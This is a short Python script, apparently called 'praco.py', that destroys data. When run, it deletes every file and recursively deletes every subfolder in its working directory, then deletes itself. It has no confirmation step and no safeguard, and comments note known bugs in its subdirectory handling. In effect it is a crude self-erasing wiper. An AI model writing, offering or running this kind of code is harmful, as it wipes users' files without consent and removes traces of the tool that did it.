import os
import shutil

files_local = []
files_sub = []
folders = []

#only deletes files in main directory, not the sub directories
#subdirectory files are not being deleted
#if theres a folder within a folder, the folder is appended to the wrong list        

def scan_for_files_and_folders():
    try:
        for item in os.listdir():
            if os.path.isfile(item):
                files_local.append(item)
            if os.path.isdir(item):
                folders.append(item)
    except Exception as e:
        print(e)
    finally:
        return folders and files_local

#Deletes all the files and directories where this program is located
def delete_files():
    for item in os.listdir():
        if os.path.isfile(item) and item != "praco.py":
            os.remove(item)
        if os.path.isdir(item):
            shutil.rmtree(item)

#Function that deletes the program            
def delete_self():
    for file in files_local:
        if file == "praco.py":
            os.remove(file)
                        
#Function that combines all the other functions together
def traverse():
    scan_for_files_and_folders()
    delete_files()
    delete_self()


traverse()

#Print statements
print("Folders found in Directories: ",folders)
print("Files found in Main Directory: ",files_local)
print("Files found in Sub Directory: ",files_sub)


        
